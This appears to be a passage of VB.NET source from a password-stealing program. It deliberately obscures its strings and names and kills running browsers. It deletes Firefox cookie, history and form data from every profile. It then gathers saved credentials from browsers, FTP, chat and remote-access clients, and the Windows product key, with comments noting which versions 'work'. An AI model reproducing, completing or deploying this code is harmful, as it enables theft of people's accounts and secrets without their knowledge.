            Dim ea As String() = rew.GetProfiles().Select(Function(d) d.ProfilePath).ToArray
            If ea.Count = 0 Then Exit Sub


            Dim r As String() = {"ZXRpbHFzLnNlaWtvb2M=", "ZXRpbHFzLnlyb3RzaWhtcm9m", "bm9zai5oY3JhZXM=", "ZXRpbHFzLnNlY2FscA=="}
            ea.ToList.ForEach(Sub(rr)
                                  r.ToList.ForEach(Sub(ww)
                                                       Dim tem As String = Path.Combine(rr, Sk.Revpep(ww))
                                                       If File.Exists(tem) Then File.Delete(tem)
                                                   End Sub)
                              End Sub)
        End Sub

        Public Sub ClAll()
            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("dGFkLmt0ZWdlZ2s="))
            If Not File.Exists(Pat) Then
                File.Create(Pat)


                Dim t As String() = {Sk.Revpep("eG9mZXJpZg=="), Sk.Revpep("YXJlcG8="), Sk.Revpep("ZW1vcmhj"), Sk.Revpep("bXVpbW9yaGM="), Sk.Revpep("b3Zvbmxvb2M="), Sk.Revpep("bm9yaSBlcmF3cnM="), Sk.Revpep("bm9nYXJk"), Sk.Revpep("a2NvbGY="), Sk.Revpep("dGxlbWtjb3I=")}

                Process.GetProcesses().ToList.ForEach(Sub(w)
                                                          If t.Contains(w.ProcessName.ToLower) Then w.Kill()
                                                      End Sub)

                Clff()
                ClChroandChroe()
                Clsajfj()
                Cloejdke()
            End If
        End Sub
    End Class

    Public Function ReadAllInfos() As List(Of daeepskwpsk)
        Dim all As New List(Of daeepskwpsk)

        Try
            Dim rte As New Clea
            rte.ClAll()
        Catch
        End Try

        Try
            all.Add(New tekkpsmee().ReadData)       'Teamviewer Works (Version 14.1.3399 Beta) #17.12.2018
            all.Add(New wkwuerzrswp().ReadData) ' Windows Key works #17.12.2018
            all.AddRange(New opdecnieo().ReadData)    'Opera Works (Version:57.0.3098.102) #17.12.2018
            all.AddRange(New saejejrpeiwr().ReadData)      'Safari (Version 5.1.7) #17.12.2018
            all.AddRange(New chroNew().ReadData)      'Google Chrome new (Version 71.0.3578.98) #17.12.2018
            all.AddRange(New fixkavwc().ReadData)   'Filezilla (Version 3.39.0) #19.12.2018

            all.AddRange(New opeushzezam().ReadData)       'Opera older Versions (Works) #22.11.2015
            all.AddRange(New chroachroejeiep().ReadData(chroachroejeiep.brkw.Both)) ' Google Chrome Old Works (Version 46.0.2490.86m x64) #22.11.2015
            all.AddRange(New mseuizr().ReadData)         'MSN Works #22.11.2015
            all.AddRange(New ffkepdkeh().ReadData)  'Firefox Works (Version 42) #22.11.2015
            all.AddRange(New pisgez().ReadData)      'Pidgin Works (Version 2.10.11)  #22.11.2015
            all.AddRange(New trkjoekdu().ReadData)    'Trillian Works (Version 5.6.0.2) #22.11.2015
            all.AddRange(New pajkejekd().ReadData)     'Paltalk Works (Version 11.6.607.17218) #22.11.2015
            all.Add(New nimejdzek().ReadData) 'Nimbuzz Works (Version 2.9.5) #22.11.2015
            'all.AddRange(New IEXplorerDecrypt().ReadData)   'Only .Net Framework 4.5

            all.AddRange(New littkkep().ReadData)          'Works
        Catch
        End Try
        '
        Return all.Distinct.Where(Function(d) Isaekep(d)).ToList
    End Function
End Class